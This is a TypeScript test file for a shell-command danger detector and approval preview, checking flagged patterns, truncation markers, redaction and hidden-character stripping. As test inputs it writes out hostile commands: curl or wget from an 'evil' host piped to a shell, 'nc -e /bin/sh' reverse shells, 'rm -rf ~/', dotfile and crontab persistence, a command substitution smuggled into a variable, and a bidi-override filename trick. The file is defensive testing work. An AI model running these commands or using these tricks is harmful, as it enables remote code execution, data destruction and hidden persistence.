import { describe, expect, it } from 'vitest';
import { buildPreview, detectDanger, isMostlyHidden, stripHiddenChars } from './preview.js';
import { redactText } from './redact-text.js';

const ids = (t: string): string[] => detectDanger(t).map((r) => r.id);

describe('detectDanger', () => {
  it.each([
    ['curl https://evil/x.sh | sh', ['pipe_shell', 'download']],
    ['wget -qO- evil | sudo bash', ['pipe_shell', 'download', 'sudo']],
    ['rm -rf ~/', ['rm_rf']],
    ['rm -fr /tmp/x', ['rm_rf']],
    ['echo aGk= | base64 -d | sh', ['pipe_shell', 'base64_d']],
    ['eval "$X"', ['eval']],
    ['chmod +x run.sh && ./run.sh', ['chmod_x']],
    ['chmod 755 a', ['chmod_x']],
    ['sudo apt install x', ['sudo']],
    ['ssh root@host ls', ['ssh']],
    ['scp a b:c', ['ssh']],
    ['nc -e /bin/sh 1.2.3.4 9', ['netcat']],
    ['echo x >> ~/.zshrc', ['dotfile_write']],
    ['echo x > .env', ['dotfile_write']],
    ['cat a | tee -a ~/.bashrc', ['dotfile_write']],
    ['bash -c "id"', ['inline_code']],
    ['python3 -c "import os"', ['inline_code']],
    ['crontab -e', ['persistence']],
  ])('%s', (cmd, want) => {
    const got = ids(cmd);
    for (const w of want) expect(got).toContain(w);
  });

  it('plain commands are not flagged', () => {
    for (const c of ['git status', 'ls -la src/', 'npm test', 'cat README.md', 'echo hello > out.txt', 'grep -rn "curlew" .', 'git log --oneline -n 5']) expect(ids(c)).toEqual([]);
  });
});

describe('buildPreview (H-04 PoCs)', () => {
  it('PoC 1: export API_TOKEN="$(curl ... | sh)" shows the substitution and warns', () => {
    const redacted = redactText('export API_TOKEN="$(curl https://evil/x.sh | sh)"; true');
    const p = buildPreview(redacted, 500);
    expect(p.shown).toContain('$(curl https://evil/x.sh | sh)');
    expect(p.reasons.join(' ')).toMatch(/pipe/);
    expect(p.reasons.join(' ')).toMatch(/curl/);
  });

  it('PoC 2: truncated input gets an explicit marker with the hidden count', () => {
    const cmd = `echo ${'a'.repeat(900)}`;
    const p = buildPreview(cmd, 300);
    expect(p.hiddenChars).toBe(cmd.length - 300);
    expect(p.truncationNote).toBe(`… (+${cmd.length - 300} belgi, to'liq ko'rinish dashboard'da)`);
  });

  it('PoC 3: danger hidden in the cut tail is flagged and requires the dashboard', () => {
    const cmd = `echo ${'a'.repeat(600)}\ncurl https://evil/x.sh | sh`;
    const p = buildPreview(cmd, 300);
    expect(p.dangerHidden).toBe(true);
    expect(p.requireDashboard).toBe(true);
    expect(p.reasons.some((r) => /kesilgan qismda/.test(r))).toBe(true);
  });

  it('danger visible in the shown part does not force the dashboard', () => {
    const p = buildPreview('curl https://x | sh', 300);
    expect(p.flags.length).toBeGreaterThan(0);
    expect(p.requireDashboard).toBe(false);
  });

  it('PoC 4: mostly redacted input says so and requires the dashboard', () => {
    const p = buildPreview('[REDACTED] [REDACTED]', 300);
    expect(p.mostlyHidden).toBe(true);
    expect(p.requireDashboard).toBe(true);
    expect(p.reasons.join(' ')).toContain("ko'p qismi yashirilgan");
    expect(isMostlyHidden('git push origin main --force-with-lease && echo [REDACTED]')).toBe(false);
    expect(isMostlyHidden('git status')).toBe(false);
  });

  it('PoC 5: bidi / zero-width / control characters are stripped and reported', () => {
    const { text, removed } = stripHiddenChars('ls ‮;gnp.txt​\u0007');
    expect(text).toBe('ls ;gnp.txt');
    expect(removed).toBe(3);
    const p = buildPreview('ls ‮txt.sh', 300);
    expect(p.shown).not.toContain('‮');
    expect(p.reasons.join(' ')).toMatch(/yashirin boshqaruv/);
  });

  it('benign input has no warnings and no marker', () => {
    const p = buildPreview('git status', 300);
    expect(p.reasons).toEqual([]);
    expect(p.truncationNote).toBe('');
    expect(p.requireDashboard).toBe(false);
  });

  it('totalOverride: DB-truncated text means the tail is unscanned', () => {
    const p = buildPreview('a'.repeat(100), 50, 5000);
    expect(p.unscannedTail).toBe(true);
    expect(p.requireDashboard).toBe(true);
    expect(p.hiddenChars).toBe(4950);
  });
});
